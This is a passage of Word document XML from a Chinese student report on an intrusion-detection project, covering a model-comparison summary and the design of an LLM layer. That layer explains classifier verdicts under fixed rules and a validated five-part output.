        <w:t xml:space="preserve">    out_path.parent.mkdir(parents=True, exist_ok=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58079DD4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    out_path.write_text(json.dumps(out, ensure_ascii=False, indent=2), encoding="utf-8")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D862EA0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    print(f"\n产物已写入 {out_path}", flush=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4330971C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45F1E22D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="675582C0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3741D75D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>if __name__ == "__main__":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C522030">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    raise SystemExit(main())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DCD3CDA">
      <w:pPr>
        <w:spacing w:before="0" w:after="160"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4FB14419">
      <w:pPr>
        <w:pStyle w:val="5"/>
        <w:spacing w:before="160" w:after="80" w:line="360" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>3.3.9 小结</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C4828E8">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>本部分交付了两样东西：一是与数据集同口径的 78 维特征提取器，二是同口径、可复现的五模型对比结论。最有价值的工作不是把 XGBoost 训到 0.9719，而是识别出随机划分下的 0.999 是划分泄漏、单段验证集选型等于抛硬币，并把选型口径改成前向滚动验证。这一步之后，报告里的每个数字都带上了“它是在什么口径下量出来的”这一注解，也才有了后面与规则基线、与大模型分工的正确表述。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="156986EE">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>本部分的三条结论里有两条对项目不利：混合森林没有超过单模型，跨天留出实验失败。它们都原样写进了本报告，没有包装成创新点。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C38AAAE">
      <w:pPr>
        <w:pStyle w:val="4"/>
        <w:pageBreakBefore w:val="0"/>
        <w:spacing w:before="240" w:after="120" w:line="360" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>3.4 潘凤乐：大模型诊断、知识检索与数据构建（M4 / M9）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="261AE617">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>本人负责“把一行判定变成一份人能读的报告”这一段：提示词与输出 schema、协议知识库与检索、多轮追问链路、以及大模型不可用时的降级路径。另外负责数据集抽样脚本与知识库内容。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55CF8EEB">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="160" w:after="60"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>表 3-8　本部分涉及的源文件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1134"/>
        <w:gridCol w:w="4422"/>
      </w:tblGrid>
      <w:tr w14:paraId="2A13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shd w:val="clear" w:color="auto" w:fill="EDEDED"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="796B5BC6">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>文件</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1134" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EDEDED"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="5277BB8E">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>行数</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4422" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EDEDED"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="18FDE29F">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>职责</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="44F7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743B3CAD">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>llm/prompts.py</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1134" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="2EDEFC44">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>121</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4422" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="5358B2DE">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>系统提示词（三条铁律）、证据与会话的格式化、请求组装</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="55F31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3A7A573F">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>llm/client.py</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1134" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="6D5B4247">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>138</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4422" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="5EE100C2">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>DeepSeek / 通义千问调用、重试、不可用时降级为模板报告</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="45D8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061" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="2D545D89">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>llm/schema.py</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1134" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="3C089720">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>111</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4422" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="245F0D0F">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>输出解析与 Pydantic 校验，字段缺失即拒绝</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="1E01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3DD4071C">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>llm/rag.py</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1134" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="71D77F0F">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>81</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4422" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="4201E72E">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>字符二元组 BM25 检索</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="4E186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721513C7">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>tools/build_sample.py</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1134" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="369FA2BE">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>223</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4422" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="52E48C66">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>按类配额抽样、列名清洗、时间序号</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="36B6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vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="6FC3EA51">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>data/rag/chunks.json</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1134" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="1B852E6D">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>12 条</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4422" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="03E1B863">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>协议知识库内容</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="45D8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3061" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="2C12839F">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>tests/test_llm_and_center.py</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1134" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="49DB318C">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>170</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4422" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="360E5B4E">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>大模型层与中心接口的联测</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="33389542">
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="23C616EA">
      <w:pPr>
        <w:pStyle w:val="5"/>
        <w:spacing w:before="160" w:after="80" w:line="360" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>3.4.1 为什么大模型只做解释、不做判断</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D0ABE25">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>这一层要解决的问题是“把结构化结论翻译成可读的中文，并且不许它自由发挥”。把大模型放在分类器之上而不是替代分类器，是有代价的：多一跳网络、多一份延迟、多一个失效点。换来的是三件事：可复现（分类器同一输入同一输出）、可评测（准确率与 F1 有明确含义）、可解释（报告是给人看的，不是给指标看的）。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="188E3759">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="120" w:after="60"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="114300" distR="114300">
            <wp:extent cx="5471795" cy="3419475"/>
            <wp:effectExtent l="0" t="0" r="146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72000" cy="3420000"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FF90BF0">
      <w:pPr>
        <w:spacing w:before="0" w:after="200"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>图 3-5　大模型诊断管线（先检索知识再组提示词，输出经 schema 校验，字段缺失即拒绝落库）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1558DE6F">
      <w:pPr>
        <w:pStyle w:val="5"/>
        <w:spacing w:before="160" w:after="80" w:line="360" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>3.4.2 三条铁律与五段式输出</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07ADB963">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>提示词里有三条铁律，写进系统提示是因为它们是这个项目最容易被模型违反的三件事：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EE52844">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:left="480" w:hanging="240"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>（1）不许改判。类别由上游分类器给出，大模型只做解释与处置建议。放任它改判，等于把一个可评测的分类器换成一个不可复现的接口。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39464F24">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:left="480" w:hanging="240"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>（2）只准引用给定证据。模型很容易把“典型 DDoS 的表现”当成“本次流量的表现”来写，报告读起来很专业，但那是编的。证据链只允许引用提示词里给出的特征值与规则命中的 detail 文本。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1770B8DD">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:left="480" w:hanging="240"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>（3）必须回到协议层。这是计算机网络课设，评审最关心的恰是“你懂不懂协议”，所以模板里固定有“协议原理回顾”一节，面向刚学完这门课的读者讲握手、状态机与字段语义。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E9ED382">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>输出是五段式：事件概述、风险等级、证据链、处置建议、协议原理回顾，由 Pydantic 模型强校验，字段缺失或风险等级不在枚举内即拒绝落库，避免模型自由发挥。温度设为 0.2，在可读性与稳定性之间折中。完整的一份报告见下图。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B35B771">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="120" w:after="60"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="114300" distR="114300">
            <wp:extent cx="5471795" cy="3208020"/>
            <wp:effectExtent l="0" t="0" r="1460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72000" cy="3208482"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E3F811F">
      <w:pPr>
        <w:spacing w:before="0" w:after="200"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>图 3-6　看板中的诊断报告：#64 PortScan，五段齐全，底部是可继续追问的输入框</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="565DF57C">
      <w:pPr>
